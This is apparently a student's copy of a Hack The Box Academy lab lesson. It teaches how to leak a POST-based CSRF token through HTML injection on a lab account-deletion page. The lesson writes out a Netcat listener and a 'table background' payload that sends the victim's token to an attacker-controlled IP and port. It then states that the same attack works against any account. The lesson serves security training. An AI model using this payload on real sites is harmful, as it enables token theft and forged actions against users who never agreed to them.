The vast majority of applications nowadays perform actions through POST requests. Subsequently, CSRF tokens will reside in POST data. Let us attack such an application and try to find a way to leak the CSRF token so that we can mount a CSRF attack.

Proceed to the end of this section and click onÂ `Click here to spawn the target system!`Â or theÂ `Reset Target`Â icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along. Don't forget to configure the specified vhost (`csrf.htb.net`) to access the application.

Navigate toÂ `http://csrf.htb.net`Â and log in to the application using the credentials below:

- Email: heavycat106
- Password: rocknrol

This is an account that we created to look at the application's functionality.

After authenticating as a user, you'll notice that you can delete your account. Let us see how one could steal the user's CSRF-Token by exploiting an HTML Injection/XSS Vulnerability.

Click on the "Delete" button. You will get redirected toÂ `/app/delete/<your-email>`

![image](https://academy.hackthebox.com/storage/modules/153/36.png)

Notice that the email is reflected on the page. Let us try inputting some HTML into theÂ _email_Â value, such as:

![Pasted image 20250219130350.png](../../../../IMAGES/Pasted%20image%2020250219130350.png)

![image](https://academy.hackthebox.com/storage/modules/153/37.png)

If you inspect the source (`Ctrl+U`), you will notice that our injection happens before aÂ `single quote`. We can abuse this to leak the CSRF-Token.

![image](https://academy.hackthebox.com/storage/modules/153/39.png)

Let us first instruct Netcat to listen on port 8000, as follows.

```shell-session
smoothment@htb[/htb]$ nc -nlvp 8000
listening on [any] 8000 ...
```

Now we can get the CSRF token via sending the below payload to our victim.


```html
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
```

While still logged in as Julie Rogers, open a new tab and visitÂ `http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f`. You will notice a connection being made that leaks the CSRF token.

![image](https://academy.hackthebox.com/storage/modules/153/40.png)

Since the attack was successful against our test account, we can do the same against any account of our choosing.

We remind you that this attack does not require the attacker to reside in the local network. HTML Injection is used to leak the victim's CSRF token remotely!

Next, we will cover how you can chain XSS and CSRF to attack a user's session.

# Question
---
![Pasted image 20250219130418.png](../../../../IMAGES/Pasted%20image%2020250219130418.png)

